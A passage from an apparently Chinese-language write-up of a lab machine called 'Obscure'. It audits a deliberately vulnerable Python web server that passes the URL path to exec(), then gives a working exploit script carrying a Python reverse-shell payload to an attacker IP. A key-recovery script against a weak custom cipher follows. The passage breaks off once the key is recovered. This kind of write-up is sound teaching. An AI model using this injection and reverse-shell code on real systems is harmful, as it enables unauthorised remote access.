   self.method = request[<span class="string">"method"</span>]</span><br><span class="line">            self.doc = request[<span class="string">"doc"</span>]</span><br><span class="line">            self.vers = request[<span class="string">"vers"</span>]</span><br><span class="line">            self.header = request[<span class="string">"header"</span>]</span><br><span class="line">            self.body = request[<span class="string">"body"</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span><span class="params">(self, request)</span>:</span>        </span><br><span class="line">        req = request.strip(<span class="string">"\r"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">" "</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:<span class="number">-3</span>]</span><br><span class="line">        body = req[<span class="number">-1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">": "</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"method"</span>: method, <span class="string">"doc"</span>: doc, <span class="string">"vers"</span>: vers, <span class="string">"header"</span>: headerDict, <span class="string">"body"</span>: body&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port)</span>:</span>    </span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span><span class="params">(self, client, address)</span>:</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size) <span class="comment"># 收到客户端的数据，应该就是数据包</span></span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data </span></span><br><span class="line">                    req = Request(data.decode()) <span class="comment"># byte转str，返回的req是list</span></span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">'Client disconnected'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span><span class="params">(self, request, conn, address)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"><span class="comment">#            try:</span></span><br><span class="line">                <span class="comment"># print(str(request.method) + " " + str(request.doc), end=' ')</span></span><br><span class="line">                <span class="comment"># print("from &#123;0&#125;".format(address[0]))</span></span><br><span class="line"><span class="comment">#            except Exception as e:</span></span><br><span class="line"><span class="comment">#                print(e)</span></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">"status"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">"/errors/400.html"</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">"400"</span></span><br><span class="line">        body = document[<span class="string">"body"</span>]</span><br><span class="line">        </span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">""</span></span><br><span class="line">        server = <span class="string">"BadHTTPServer"</span></span><br><span class="line">        modified = <span class="string">""</span></span><br><span class="line">        length = len(body)</span><br><span class="line">        contentType = document[<span class="string">"mime"</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">"Closed"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode, </span><br><span class="line">        dateSent = dateSent, server = server, </span><br><span class="line">        modified = modified, length = length, </span><br><span class="line">        contentType = contentType, connectionType = connectionType, </span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">"output = 'Document: &#123;&#125;'"</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">"/"</span>:</span><br><span class="line">                path = <span class="string">"/index.html"</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">"text/html"</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">"."</span>)[<span class="number">-1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">"200"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"404.html"</span>)</span><br><span class="line">                mime = <span class="string">"text/html"</span></span><br><span class="line">                <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().format(path)</span><br><span class="line">                status = <span class="string">"404"</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"500.html"</span>)</span><br><span class="line">            mime = <span class="string">"text/html"</span></span><br><span class="line">            <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">"500"</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"body"</span>: data, <span class="string">"mime"</span>: mime, <span class="string">"status"</span>: status&#125;</span><br></pre></td></tr></table></figure><p>审计源码发现关键点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = <span class="string">"output = 'Document: &#123;&#125;'"</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">        exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">        cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        docRoot = os.path.join(cwd, docRoot)</span><br></pre></td></tr></table></figure><p>大致说一下代码的含义，开启socket监听，接收到http请求，调用 <code>Request</code> 类的 <code>parseRequest</code> 方法做分割，然后调用 <code>handleRequest</code> 处理请求，通过 <code>serveDoc</code> 处理请求的文档</p><p><code>exec</code> 函数处存在命令注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">33</span>]: path = <span class="string">"/';os.system('whoami')#"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: exec(info.format(path))</span><br><span class="line">laptop-ubiep4k5\zz</span><br></pre></td></tr></table></figure><p>然后就可以通过python反弹shell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://10.10.10.168:8080/'</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">'5\''</span>+<span class="string">'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.146",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''</span></span><br><span class="line"></span><br><span class="line">payload = urllib.parse.quote(path)</span><br><span class="line">print(<span class="string">"payload"</span>)</span><br><span class="line">print(url+payload)</span><br><span class="line"></span><br><span class="line">r= requests.get(url+payload)</span><br><span class="line">print(r.headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>反弹到shell之后继续进行信息收集：</p><p><code>check.txt</code>，大致含义就是加密了这个文件，加密的结果是 <code>out.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert$ cat check.txt</span><br><span class="line">cat check.txt</span><br><span class="line">Encrypting this file with your key should result <span class="keyword">in</span> out.txt, make sure your key is correct!</span><br></pre></td></tr></table></figure><p><code>out.txt</code>, 这个就是加密的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ xxd out.txt</span><br><span class="line">xxd out.txt</span><br><span class="line">00000000: c2a6 c39a c388 c3aa c39a c39e c398 c39b  ................</span><br><span class="line">00000010: c39d c39d c289 c397 c390 c38a c39f c285  ................</span><br><span class="line">00000020: c39e c38a c39a c389 c292 c3a6 c39f c39d  ................</span><br><span class="line">00000030: c38b c288 c39a c39b c39a c3aa c281 c399  ................</span><br><span class="line">00000040: c389 c3ab c28f c3a9 c391 c392 c39d c38d  ................</span><br><span class="line">00000050: c390 c285 c3aa c386 c3a1 c399 c39e c3a3  ................</span><br><span class="line">00000060: c296 c392 c391 c288 c390 c3a1 c399 c2a6  ................</span><br><span class="line">00000070: c395 c3a6 c398 c29e c28f c3a3 c38a c38e  ................</span><br><span class="line">00000080: c38d c281 c39f c39a c3aa c386 c28e c39d  ................</span><br><span class="line">00000090: c3a1 c3a4 c3a8 c289 c38e c38d c39a c28c  ................</span><br><span class="line">000000a0: c38e c3ab c281 c391 c393 c3a4 c3a1 c39b  ................</span><br><span class="line">000000b0: c38c c397 c289 c281 76                   ........v</span><br></pre></td></tr></table></figure><p><code>passwordreminder.txt</code> 又是一个加密后的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:&#x2F;home&#x2F;robert$ hd passwordreminder.txt</span><br><span class="line">hd passwordreminder.txt</span><br><span class="line">00000000  c2 b4 c3 91 c3 88 c3 8c  c3 89 c3 a0 c3 99 c3 81  |................|</span><br><span class="line">00000010  c3 91 c3 a9 c2 af c2 b7  c2 bf 6b                 |..........k|</span><br><span class="line">0000001b</span><br></pre></td></tr></table></figure><p> <code>BetterSSH.py</code> (这个之后提权会用到)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/BetterSSH$ cat BetterSSH.py</span><br><span class="line">cat BetterSSH.py</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">''</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">"user"</span>: <span class="string">""</span>, <span class="string">"authenticated"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">'user'</span>] = input(<span class="string">"Enter username: "</span>)</span><br><span class="line">    passW = input(<span class="string">"Enter password: "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            passwords.append(x)</span><br><span class="line"></span><br><span class="line">    passwordFile = <span class="string">'\n'</span>.join([<span class="string">'\n'</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> passwords])</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/tmp/SSH/'</span>+path, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(passwordFile)</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    salt = <span class="string">""</span></span><br><span class="line">    realPass = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="keyword">if</span> p[<span class="number">0</span>] == session[<span class="string">'user'</span>]:</span><br><span class="line">            salt, realPass = p[<span class="number">1</span>].split(<span class="string">'$'</span>)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> salt == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"Invalid user"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    salt = <span class="string">'$6$'</span>+salt+<span class="string">'$'</span></span><br><span class="line">    realPass = salt + realPass</span><br><span class="line"></span><br><span class="line">    hash = crypt.crypt(passW, salt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hash == realPass:</span><br><span class="line">        print(<span class="string">"Authed!"</span>)</span><br><span class="line">        session[<span class="string">'authenticated'</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Incorrect pass"</span>)</span><br><span class="line">        os.remove(<span class="string">'/tmp/SSH/'</span>+path)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    os.remove(os.path.join(<span class="string">'/tmp/SSH/'</span>,path))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    traceback.print_exc()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'authenticated'</span>] == <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        command = input(session[<span class="string">'user'</span>] + <span class="string">"@Obscure$ "</span>)</span><br><span class="line">        cmd = [<span class="string">'sudo'</span>, <span class="string">'-u'</span>,  session[<span class="string">'user'</span>]]</span><br><span class="line">        cmd.extend(command.split(<span class="string">" "</span>))</span><br><span class="line">        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">        o,e = proc.communicate()</span><br><span class="line">        print(<span class="string">'Output: '</span> + o.decode(<span class="string">'ascii'</span>))</span><br><span class="line">        print(<span class="string">'Error: '</span>  + e.decode(<span class="string">'ascii'</span>)) <span class="keyword">if</span> len(e.decode(<span class="string">'ascii'</span>)) &gt; <span class="number">0</span> <span class="keyword">else</span> print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><code>SuperSecureCrypt.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert$ cat SuperSecureCrypt.py</span><br><span class="line">cat SuperSecureCrypt.py</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr - ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Encrypt with 0bscura\'s encryption algorithm'</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-i'</span>,</span><br><span class="line">                    metavar=<span class="string">'InFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'The file to read'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>,</span><br><span class="line">                    metavar=<span class="string">'OutFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Where to output the encrypted/decrypted file'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-k'</span>,</span><br><span class="line">                    metavar=<span class="string">'Key'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Key to use'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-d'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'Decrypt mode'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">banner = <span class="string">"################################\n"</span></span><br><span class="line">banner+= <span class="string">"#           BEGINNING          #\n"</span></span><br><span class="line">banner+= <span class="string">"#    SUPER SECURE ENCRYPTOR    #\n"</span></span><br><span class="line">banner+= <span class="string">"################################\n"</span></span><br><span class="line">banner += <span class="string">"  ############################\n"</span></span><br><span class="line">banner += <span class="string">"  #        FILE MODE         #\n"</span></span><br><span class="line">banner += <span class="string">"  ############################"</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"Missing args"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Decrypting..."</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Encrypting..."</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted)</span><br></pre></td></tr></table></figure><p>从加密的脚本中可以知道关键的加密逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br></pre></td></tr></table></figure><p>所以我们只需要爆破密钥了</p><p>爆破脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'check.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ta = f.read()</span><br><span class="line">    </span><br><span class="line">key=<span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>,encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(data)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">            ch = chr((ord(data[x])-i)%<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">if</span> ch == ta[x]:</span><br><span class="line">                key +=chr(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(key)</span><br></pre></td></tr></table></figure><p>得到密钥</p><figure 